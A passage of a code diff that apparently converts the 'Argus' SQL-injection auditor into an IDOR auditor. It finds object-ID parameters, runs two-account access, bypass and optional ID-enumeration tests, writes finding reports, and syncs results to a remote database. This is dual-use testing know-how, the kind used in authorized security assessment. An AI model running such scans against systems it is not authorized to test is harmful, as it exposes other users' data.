+    surfaces = unique
 
-    # ── Sort ────────────────────────────────────────────────────────────────
-    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
-    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))
+    log.info(f"  Phase 1 — {len(surfaces)} surface(s) discovered")
+    if not surfaces:
+        log.warning("  No surfaces — writing empty report")
+        return _write_empty_report(outdir, live_urls_file, start, total_input=len(urls))
 
-    # ── Write outputs ────────────────────────────────────────────────────────
-    elapsed = time.monotonic() - start
-    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
-    by_technique: dict[str, int] = {}
-    by_dbms: dict[str, int] = {}
-
-    for f in deduped:
-        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
-        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
-        if f.dbms:
-            by_dbms[f.dbms] = by_dbms.get(f.dbms, 0) + 1
-
-    # Flat candidates
-    candidate_lines = [
-        f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t{f.confidence}\t{f.dbms}\t{f.evidence[:120]}"
-        for f in deduped
-    ]
-    (outdir / "sqli_candidates.txt").write_text("\n".join(candidate_lines) + "\n")
-
-    # Confirmed (HIGH+)
-    confirmed = [f for f in deduped if f.severity in ("CRITICAL", "HIGH") and f.repeatable]
-    (outdir / "sqli_confirmed.txt").write_text(
+    (outdir / "idor_surface.txt").write_text(
         "\n".join(
-            f"{f.target}\t{f.param}\t{f.technique}\t{f.dbms}\t{f.payload[:120]}"
-            for f in confirmed
+            f"{s.method}\t{s.endpoint}\t{s.param_name}\t{s.param_location}\t{s.id_type}"
+            for s in surfaces
         ) + "\n"
     )
 
-    # Fingerprints
-    fp_lines = [
-        f"{r.url}\t{r.param}\t{r.dbms or 'unknown'}"
-        for r in results if r.dbms
-    ]
-    (outdir / "sqli_fingerprints.txt").write_text("\n".join(fp_lines) + "\n")
+    # ── Build shared session + rate limiter
+    limiter = SharedRateLimiter(eff_rate)
+    session_a = Session(limiter, user_a_headers or cfg_hdrs, eff_timeout)
+    session_b = Session(limiter, user_b_headers or {}, eff_timeout) if dual_session else None
 
-    # JSON report
+    all_findings: list[IDORFinding] = []
+
+    if not user_a_headers and not cfg_hdrs:
+        # Surface-only
+        for s in surfaces:
+            all_findings.append(IDORFinding(
+                target=s.endpoint, vuln_type="idor_surface_candidate",
+                hypothesis="IDOR_SURFACE",
+                param_name=s.param_name,
+                param_location=s.param_location,
+                id_type=s.id_type,
+                severity="MEDIUM", confidence=CONF_CANDIDATE,
+                confirmed=False,
+                evidence=f"{s.param_location} '{s.param_name}' ({s.id_type}); supply test accounts to confirm",
+                details=s.to_dict(),
+                auth_enabled=False,
+            ))
+    else:
+        def _process(surface: ObjectSurface) -> list[IDORFinding]:
+            local: list[IDORFinding] = []
+            host_url = f"{urllib.parse.urlparse(surface.endpoint).scheme}://{urllib.parse.urlparse(surface.endpoint).netloc}"
+
+            hdrs_a = user_a_headers or cfg_hdrs
+            hdrs_b = user_b_headers or {}
+
+            own_ids = _harvest_ids(session_a, surface, hdrs_a, host_url)
+            other_ids = _harvest_ids(session_b, surface, hdrs_b, host_url) if session_b else []
+
+            own_id = user_a_id or (own_ids[0] if own_ids else "")
+            other_id = user_b_id or (other_ids[0] if other_ids else "")
+
+            if not own_id:
+                return local
+
+            if session_b and other_id and other_id != own_id:
+                local.extend(test_idor_dual(
+                    session_a, session_b, surface,
+                    own_id, other_id, hdrs_a, hdrs_b,
+                ))
+                # Bypasses only if no confirmation
+                if test_bypasses and not any(f.confirmed for f in local):
+                    local.extend(test_bypasses(
+                        session_a, surface, own_id, other_id, hdrs_a,
+                    ))
+            elif enumerate:
+                local.extend(test_enumeration(
+                    session_a, surface, own_id, hdrs_a,
+                ))
+            return local
+
+        log.info(f"  Phase 2 — Testing {len(surfaces)} surface(s)")
+        with ThreadPoolExecutor(max_workers=eff_conc) as pool:
+            futures = {pool.submit(_process, s): s for s in surfaces}
+            for fut in as_completed(futures):
+                s = futures[fut]
+                try:
+                    results = fut.result()
+                    if results:
+                        all_findings.extend(results)
+                        confirmed = sum(1 for r in results if r.confirmed)
+                        tag = f" ({confirmed} confirmed)" if confirmed else ""
+                        log.info(f"    {s.endpoint[:60]:<60} {len(results)} finding(s){tag}")
+                except Exception as e:
+                    log.debug(f"    error on {s.endpoint}: {e}")
+
+    # ── Dedupe + sort
+    seen_f: set[tuple] = set()
+    deduped: list[IDORFinding] = []
+    for f in all_findings:
+        key = (f.target, f.vuln_type, f.technique, f.own_id, f.other_id)
+        if key not in seen_f:
+            seen_f.add(key)
+            f.auth_enabled = auth_on
+            if not f.first_seen:
+                f.first_seen = _db_now()
+            deduped.append(f)
+
+    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 5), 0 if f.confirmed else 1, -f.confidence, f.target))
+
+    # ── Reports
+    elapsed = time.monotonic() - start
+    by_severity = {k: 0 for k in SEV_ORDER}
+    by_technique: dict[str, int] = {}
+    by_hypothesis: dict[str, int] = {}
+    confirmed_list: list[IDORFinding] = []
+    shared_list: list[IDORFinding] = []
+
+    for f in deduped:
+        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
+        if f.technique:
+            by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
+        by_hypothesis[f.hypothesis] = by_hypothesis.get(f.hypothesis, 0) + 1
+        if f.confirmed:
+            confirmed_list.append(f)
+        if f.shared_resource:
+            shared_list.append(f)
+
+    (outdir / "idor_candidates.txt").write_text(
+        "\n".join(
+            f"{f.target}\t{f.vuln_type}\t{f.technique}\t{f.severity}\t{f.confidence}\t"
+            f"{'CONFIRMED' if f.confirmed else 'SHARED' if f.shared_resource else 'candidate'}\t{f.evidence[:160]}"
+            for f in deduped
+        ) + ("\n" if deduped else "")
+    )
+    (outdir / "idor_confirmed.txt").write_text(
+        "\n".join(
+            f"{f.target}\t{f.vuln_type}\t{f.technique}\t{f.own_id}→{f.other_id}\t{f.evidence[:160]}"
+            for f in confirmed_list
+        ) + ("\n" if confirmed_list else "")
+    )
+
     report = {
         "generated_at": datetime.now(timezone.utc).isoformat(),
         "elapsed_seconds": round(elapsed, 2),
-        "input_file": str(urls_file),
+        "input_file": str(live_urls_file),
+        "auth_enabled": auth_on,
+        "dual_session": dual_session,
         "config": {
-            "baseline_samples":  BASELINE_SAMPLES,
-            "confirm_attempts":  CONFIRM_ATTEMPTS,
-            "time_delay":        TIME_DELAY_SECONDS,
-            "test_union":        test_union,
-            "test_stacked":      test_stacked,
+            "rate_limit":    eff_rate,
+            "concurrency":   eff_conc,
+            "timeout":       eff_timeout,
+            "test_bypasses": test_bypasses,
+            "enumerate":     enumerate,
+            "max_ids":       max_ids_per_surface,
         },
         "totals": {
             "urls_input":       len(urls),
-            "pairs_tested":     len(candidates),
+            "surfaces":         len(surfaces),
             "total_findings":   len(deduped),
-            "confirmed":        len(confirmed),
-            "critical":         by_severity["CRITICAL"],
-            "high":             by_severity["HIGH"],
-            "medium":           by_severity["MEDIUM"],
-            "low":              by_severity["LOW"],
+            "confirmed":        len(confirmed_list),
+            "shared_resources": len(shared_list),
+            "critical":         by_severity.get("CRITICAL", 0),
+            "high":             by_severity.get("HIGH", 0),
+            "medium":           by_severity.get("MEDIUM", 0),
+            "low":              by_severity.get("LOW", 0),
         },
         "summary": {
-            "by_severity":  by_severity,
-            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
-            "by_dbms":      dict(sorted(by_dbms.items(), key=lambda kv: -kv[1])),
+            "by_severity":   by_severity,
+            "by_technique":  dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
+            "by_hypothesis": dict(sorted(by_hypothesis.items(), key=lambda kv: -kv[1])),
         },
-        "results":  [r.to_dict() for r in results],
         "findings": [f.to_dict() for f in deduped],
     }
 
-    json_path = outdir / "sqli_findings.json"
+    json_path = outdir / "idor_findings.json"
     json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
 
-    # ── Console summary ─────────────────────────────────────────────────────
+    # ── Self-sync
+    if scan_id is not None:
+        log.info("")
+        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
+        _self_sync(scan_id, deduped)
+    else:
+        log.info("")
+        log.info("  DB sync  : deferred to main.py (no scan_id passed)")
+
+    # ── Summary
     log.info("")
     log.info("  Outputs :")
-    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
-    log.info(f"    sqli_candidates.txt          {len(deduped):>5} candidate(s)")
-    log.info(f"    sqli_confirmed.txt           {len(confirmed):>5} confirmed")
-    log.info(f"    sqli_fingerprints.txt        {len(fp_lines):>5} fingerprint(s)")
-
+    log.info(f"    {json_path.name:<30} {len(deduped):>5} finding(s)")
+    log.info(f"    idor_candidates.txt            {len(deduped):>5} candidate(s)")
+    log.info(f"    idor_confirmed.txt             {len(confirmed_list):>5} confirmed")
+    log.info(f"    idor_surface.txt               {len(surfaces):>5} surface(s)")
     log.info("")
     log.info(
-        f"  Severity : "
-        f"CRITICAL={by_severity['CRITICAL']}  "
-        f"HIGH={by_severity['HIGH']}  "
-        f"MEDIUM={by_severity['MEDIUM']}  "
-        f"LOW={by_severity['LOW']}"
+        f"  Severity : CRITICAL={by_severity.get('CRITICAL', 0)}  "
+        f"HIGH={by_severity.get('HIGH', 0)}  MEDIUM={by_severity.get('MEDIUM', 0)}  "
+        f"LOW={by_severity.get('LOW', 0)}"
     )
-
-    if by_dbms:
-        log.info(f"  DBMS     : " + " · ".join(f"{k}({v})" for k, v in by_dbms.items()))
-    if by_technique:
-        log.info(f"  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))
-
-    if confirmed:
+    log.info(f"  Confirmed: {len(confirmed_list)}/{len(deduped)}  "
+             f"· Shared (not IDOR): {len(shared_list)}")
+    if confirmed_list:
         log.info("")
-        log.info("  Confirmed findings:")
-        for f in confirmed[:10]:
-            log.info(f"    [{f.severity:<8}] {f.technique:<10} {f.param:<15} {f.target[:55]}")
-
+        log.info("  Confirmed IDOR findings:")
+        for f in confirmed_list[:10]:
+            log.info(f"    [{f.severity:<8}] {f.technique:<22} {f.target[:60]}")
     log.info("")
     log.info(f"  Completed in {elapsed:.1f}s")
     return json_path
 
 
 def _write_empty_report(
-    outdir: Path, input_file: Path, start: float,
+    outdir: Path, input_file: Path, start: float, total_input: int = 0,
 ) -> Path:
     report = {
         "generated_at": datetime.now(timezone.utc).isoformat(),
         "elapsed_seconds": round(time.monotonic() - start, 2),
         "input_file": str(input_file),
+        "auth_enabled": False,
+        "dual_session": False,
         "config": {},
         "totals": {
-            "urls_input": 0, "pairs_tested": 0, "total_findings": 0,
-            "confirmed": 0, "critical": 0, "high": 0, "medium": 0, "low": 0,
+            "urls_input": total_input, "surfaces": 0, "total_findings": 0,
+            "confirmed": 0, "shared_resources": 0,
+            "critical": 0, "high": 0, "medium": 0, "low": 0,
         },
-        "summary": {"by_severity": {}, "by_technique": {}, "by_dbms": {}},
-        "results": [],
+        "summary": {"by_severity": {}, "by_technique": {}, "by_hypothesis": {}},
         "findings": [],
     }
-    path = outdir / "sqli_findings.json"
+    path = outdir / "idor_findings.json"
     path.write_text(json.dumps(report, indent=2) + "\n")
-    for name in ("sqli_candidates.txt", "sqli_confirmed.txt", "sqli_fingerprints.txt"):
+    for name in ("idor_candidates.txt", "idor_confirmed.txt", "idor_surface.txt"):
         (outdir / name).write_text("")
     return path
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  STANDALONE TEST
+#  STANDALONE
 # ═════════════════════════════════════════════════════════════════════════════
 
 if __name__ == "__main__":
-    import argparse
-
     logging.basicConfig(
         level=logging.INFO,
         format="%(message)s",
         handlers=[logging.StreamHandler(sys.stdout)],
     )
     base = Path(__file__).resolve().parent.parent
-    default_input = base / "output" / "gf_sqli.txt"
+    default_input = base / "output" / "urls_with_params.txt"
     if not default_input.exists():
-        default_input = base / "output" / "urls_with_params.txt"
-    if not default_input.exists():
-        default_input = base / "output" / "all_urls.txt"
-    out = base / "output"
+        default_input = base / "output" / "live_urls.txt"
 
-    parser = argparse.ArgumentParser(description="Argus SQLi Auditor (standalone)")
+    parser = argparse.ArgumentParser(description="Argus IDOR Auditor (standalone)")
     parser.add_argument("--input", type=Path, default=default_input)
-    parser.add_argument("--output", type=Path, default=out)
-    parser.add_argument("--cookie", help="Session cookie")
-    parser.add_argument("--max-endpoints", type=int, default=500)
-    parser.add_argument("--no-union", action="store_true")
-    parser.add_argument("--no-stacked", action="store_true")
+    parser.add_argument("--output", type=Path, default=base / "output")
+    parser.add_argument("--scan-id", type=int, default=None)
+    parser.add_argument("--rate-limit", type=int, default=None)
+    parser.add_argument("--concurrency", type=int, default=None)
+    parser.add_argument("--user-a-headers", help="JSON dict of User A headers")
+    parser.add_argument("--user-b-headers", help="JSON dict of User B headers")
+    parser.add_argument("--user-a-id")
+    parser.add_argument("--user-b-id")
+    parser.add_argument("--graphql-schema", type=Path, default=None)
+    parser.add_argument("--enumerate", action="store_true",
+                        help="Enable sequential enumeration (opt-in)")
+    parser.add_argument("--no-bypasses", action="store_true")
     args = parser.parse_args()
 
-    headers = {"Cookie": args.cookie} if args.cookie else None
+    ua = json.loads(args.user_a_headers) if args.user_a_headers else None
+    ub = json.loads(args.user_b_headers) if args.user_b_headers else None
 
     try:
-        run_sqli_scan(
+        run_idor_audit(
             args.input, args.output,
-            test_union=not args.no_union,
-            test_stacked=not args.no_stacked,
-            max_endpoints=args.max_endpoints,
-            headers=headers,
+            rate_limit=args.rate_limit,
+            concurrency=args.concurrency,
+            user_a_headers=ua,
+            user_b_headers=ub,
+            user_a_id=args.user_a_id,
+            user_b_id=args.user_b_id,
+            graphql_schema_file=args.graphql_schema,
+            test_bypasses=not args.no_bypasses,
+            enumerate=args.enumerate,
+            scan_id=args.scan_id,
         )
     except Exception as e:
         log.error(f"failed: {e}")
